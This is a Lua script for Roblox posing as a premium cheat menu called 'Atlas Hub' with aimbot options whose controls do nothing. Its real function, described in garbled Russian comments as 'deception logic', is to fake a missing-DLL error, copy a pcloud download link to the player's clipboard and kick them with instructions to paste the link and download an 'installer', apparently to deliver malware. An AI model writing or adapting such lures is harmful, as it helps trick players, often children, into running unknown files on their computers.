--[[
    ATLAS HUB v4.2 [PREMIUM]
    Status: UNDETECTED
    Updated: 2025
]]

local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

-- Ð¡Ð¾Ð·Ð´Ð°ÐµÐ¼ Ð¾ÐºÐ½Ð¾
local Window = OrionLib:MakeWindow({
    Name = "Atlas Hub | Premium Script",
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "AtlasConfig",
    IntroText = "Loading Atlas..."
})

-- ÐÐºÐ»Ð°Ð´ÐºÐ° "Status"
local Tab = Window:MakeTab({
    Name = "Status",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

-- Ð¤ÐµÐ¹ÐºÐ¾Ð²Ð°Ñ Ð·Ð°Ð³ÑÑÐ·ÐºÐ°
Tab:AddParagraph("System Check", "Verifying dependencies...")

-- ÐÐ¾Ð³Ð¸ÐºÐ° Ð¾Ð±Ð¼Ð°Ð½Ð°
spawn(function()
    wait(2)
    OrionLib:MakeNotification({
        Name = "Error Detected",
        Content = "Missing Dependency: 'Atlas_Core.dll' not found.",
        Image = "rbxassetid://4483345998",
        Time = 10
    })
    
    wait(1)
    
    -- ÐÐ»Ð°Ð²Ð½Ð¾Ðµ ÑÐ¾Ð¾Ð±ÑÐµÐ½Ð¸Ðµ
    local msg = Instance.new("Message", workspace)
    msg.Text = "CRITICAL ERROR: Core DLL missing. Please download the installer from the link copied to your clipboard."
    
    -- ÐÐ¾Ð¿Ð¸ÑÑÐµÐ¼ ÑÑÑÐ»ÐºÑ Ð² Ð±ÑÑÐµÑ Ð¾Ð±Ð¼ÐµÐ½Ð°
    setclipboard("https://e.pcloud.link/publink/show?code=XZbEV3ZbqK5vb2aAu5QnPLg2SpPvpPLCUoV") -- <-- ÐÐ¡Ð¢ÐÐÐ¬ Ð¡Ð®ÐÐ Ð¡ÐÐÐ® Ð¡Ð¡Ð«ÐÐÐ£
    
    -- ÐÐ¸Ðº Ð¸Ð³ÑÐ¾ÐºÐ° (Ð´Ð»Ñ ÑÐ±ÐµÐ´Ð¸ÑÐµÐ»ÑÐ½Ð¾ÑÑÐ¸)
    wait(3)
    game.Players.LocalPlayer:Kick("\n[ATLAS ERROR 0x4B]\n\nMissing required files.\nDownload link has been copied to your clipboard.\n\nPaste it in your browser to fix.")
end)

local Tab2 = Window:MakeTab({ Name = "Aimbot", Icon = "rbxassetid://4483345998", PremiumOnly = false })
Tab2:AddToggle({ Name = "Silent Aim", Default = false, Callback = function() end })
Tab2:AddSlider({ Name = "FOV", Min = 0, Max = 100, Default = 50, Color = Color3.fromRGB(255,255,255), Increment = 1, Callback = function() end })

OrionLib:Init()